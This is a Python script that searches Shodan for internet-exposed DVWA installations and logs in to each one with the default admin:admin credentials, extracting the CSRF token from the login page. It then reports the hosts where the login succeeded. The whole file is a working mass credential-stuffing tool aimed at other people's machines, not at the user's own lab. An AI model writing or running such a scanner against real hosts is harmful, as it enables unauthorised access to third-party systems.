#!/usr/bin/env python3
import os
import re
import sys
import time
import requests
import shodan

os.system('cls' if os.name == 'nt' else 'clear')

SHODAN_API_KEY = input("[*] Enter Shodan API Key: ")
api = shodan.Shodan(SHODAN_API_KEY)

# Requests a page of data from shodan.
def request_page_from_shodan(query, page=1):
    while True:
        try:
            instances = api.search(query, page=page)
            return instances
        except shodan.APIError as e:
            print(f"\033[91mError: \033[0m{e}")
            time.sleep(3)
            sys.exit(0)

# Try the default credentials on a given instance of DVWA, simulating a real user trying the credentials
# visits the login.php page to get the CSRF token, and tries to login with admin:admin.
def has_valid_credentials(instance):
    sess = requests.Session()
    proto = ('ssl' in instance) and 'https' or 'http'
    try:
        res = sess.get(f"{proto}://{instance['ip_str']}:{instance['port']}/login.php", verify=False)
    except requests.exceptions.ConnectionError:
        return False
    if res.status_code != 200:
        print(f"[-] Got HTTP status code {res.status_code}, expected 200")
        return False
    # Search the CSRF token using regex.
    token = re.search(r"user_token' value='([0-9a-f]+)'", res.text).group(1)
    res = sess.post(
        f"{proto}://{instance['ip_str']}:{instance['port']}/login.php",
        f"username=admin&password=admin&user_token={token}&Login=Login",
        allow_redirects=False,
        verify=False,
        headers={'Content-Type': 'application/x-www-form-urlencoded'}
    )
    if res.status_code == 302 and res.headers['Location'] == 'index.php':
        # Redirects to index.php, and expect an authentication success.
        return True
    else:
        return False

# Takes a page of results, and scans each of them, running has_valid_credentials.
def process_page(page):
    result = []
    for instance in page['matches']:
        if has_valid_credentials(instance):
            print(f"[+] valid credentials at : {instance['ip_str']}:{instance['port']}")
            result.append(instance)
    return result

# Searches on shodan using the given query, and iterates over each page of the results.
def query_shodan(query):
    print("[*] querying the first page")
    first_page = request_page_from_shodan(query)
    total = first_page['total']
    already_processed = len(first_page['matches'])
    result = process_page(first_page)
    page = 2
    while already_processed < total:
        break   # Break just in the testing, API queries have monthly limits.
        print("querying page {page}")
        page = request_page_from_shodan(query, page=page)
        already_processed += len(page['matches'])
        result += process_page(page)
        page += 1
    return result

res = query_shodan('title:dvwa')
print(res)